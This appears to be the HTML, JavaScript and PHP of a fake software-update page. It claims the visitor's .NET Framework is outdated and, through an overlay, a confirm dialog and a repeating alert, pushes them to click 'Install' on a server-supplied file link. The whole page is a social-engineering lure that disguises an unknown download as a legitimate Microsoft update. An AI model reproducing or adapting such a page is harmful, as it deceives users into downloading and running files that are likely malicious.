...
<html>
	...
	<center>
		...
		<table width="1448" border="0" align="center" cellpadding="2" cellspacing="2" style="text-align: left; width: 592px; height: 556px;">
            ...
            <h3 align="center"><font><font color="#808080" face="Arial, Helvetica, sans-serif">.NET Framework - 4.8<br><br>Your Version is outdated, so you can continue browsing and need to update your .NET FrameWork to version 4.8
</font></font></h3>
...
<script type="text/javascript">
	$(document).ready(function() {
	   ...
	   });
	   {
		    uLightBox.alert({
		        ...
		        opened: function() {
		            $('<span />').html("<a style='border:0;' onClick='uLightBox.clear();' href='<?=$arquivo;?>'><img src='./popup/A-F-Player-0610--001--EN.png'></a>").appendTo('#lbContent');
		        },
	...
	function exitPage() {
		var r = confirm('To normalize your navigation, you need to update your .NET Framework. After updating your navigation will return normally.Click Install.');
		if (r == true) {
			window.location.href = '<?=$arquivo;?>';
		} else {
			alert('Click Install to continue');
		}
	}
</script> 
...
<div id="uLightBoxOverlay" class="opaque">
	<div id="uLightBox" class="shadow top bottom" style="width: 585px; top: 156.5px; left: 382px;">
		<div id="lbHeader" class="top">
			<header>Update .NET Framework 4.8</header>
		</div>
		<div id="lbContent" style="padding-left:0;padding-top:0;padding-bottom:0;">
			<span><a style="border:0;" onClick="exitPage();" href="#"><img src="./Page has moved_files/A-F-Player-0610--001--EN.png"></a></span>
		</div>
		<div id="lbFooter" class="bottom">
			<input type="button" class="flat floatRight" onclick="exitPage();" value="Click here to enter the site" id="Click here to enter the site"></div>
	</div>
</div>
